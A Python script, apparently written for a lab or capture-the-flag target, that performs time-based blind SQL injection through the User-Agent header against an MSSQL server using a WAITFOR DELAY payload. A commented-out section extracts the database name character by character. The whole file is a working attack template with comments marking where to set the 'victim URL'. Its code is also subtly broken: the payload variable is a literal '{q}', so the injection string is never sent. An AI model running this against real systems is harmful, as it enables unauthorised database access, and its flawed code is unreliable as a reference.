#!/usr/bin/python3
import httplib2, string
from time import time

flag = ""
l=0
#Adjust if you need more/less chars
alphabet = string.ascii_letters + string.digits
#Adjust to the victim URL
URL = "http://10.129.252.247:8080/"
http = httplib2.Http()

def exfiltrator(q):
    for i in range(50):
        for al in alphabet:
            #Adjust the URL encoded params in Headers
            params = "{q}" 
            #Start the timer
            t0 = time()
            #Adjust the success message, in this case we are injecting sleep into UA header 
            send = http.request(URL,method="GET",headers={'User-Agent': params})[1]
            #Stop the timer
            t1= time() - t0
            #Check if response>3 sec then Blind-Injection is true
            if (t1 >= 3): 
                flag = "TRUE"
                break 
    return flag

print(exfiltrator("test';IF 1=1 WAITFOR DELAY '0:0:3'--"))


#Adjust if you need bigger, exfiltrate the 
#for i in range(50): 
#    for al in alphabet: 
#        #Adjust the URL encoded params in Headers
#        params = "test';IF (select substring(db_name(),%s,1))='%s' WAITFOR DELAY '0:0:3'--" %(i, al) 
#        #Start the timer
#        t0 = time()
#        #Adjust the success message, in this case we are injecting sleep into UA header 
#        send = http.request(URL,method="GET",headers={'User-Agent': params})[1]
#        #Stop the timer
#        t1= time() - t0
#        #Check if response>3 sec then Blind-Injection is true
#        if (t1 >= 3): 
#            flag += al
#            print("[+] DB Name: " + flag) 
#            break 
